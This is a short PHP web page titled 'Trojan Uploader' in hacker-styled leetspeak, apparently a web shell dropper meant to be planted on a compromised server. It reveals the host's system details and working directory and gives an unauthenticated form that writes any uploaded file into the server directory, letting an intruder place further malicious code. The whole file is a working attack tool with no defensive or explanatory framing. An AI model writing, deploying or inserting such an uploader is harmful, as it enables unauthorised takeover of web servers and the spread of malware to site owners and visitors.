<title>.: 7r0j4n Upl04der :. </title> <style type="text/css">
body {
  color: #33ff33;
  background-color: black;
  font-weight: inherit;
}
h1,h2{
  text-align: center;
}
h3,h4,h5{
  color: silver;
  text-align: center;
}
</style>
<b><br>
<h1><font face="courier" color="white" style="text-shadow: 0px 0px 30px white;"> 7r0j4n Upl04der </h1><br><center>
<br></b> <?php
echo '<font color=white size=4> System: <font color=red size=5>[ <font color=lime size=3>'.php_uname().'<font color=red size=5> ]</font><br>';
echo '<font color=white size=4>Directory: <font color=red size=5>[ <font color=lime size=3>'.getcwd().'<font color=red size=5> ]</font><br><br>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50">
<input name="_upl" type="submit" id="_upl" value="Upload">
</form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
{
echo '<b>Upload Success!</b><br><br>';
}
else
{
echo '<b>Upload Fail!</b><br><br></font>';
}
}

?>
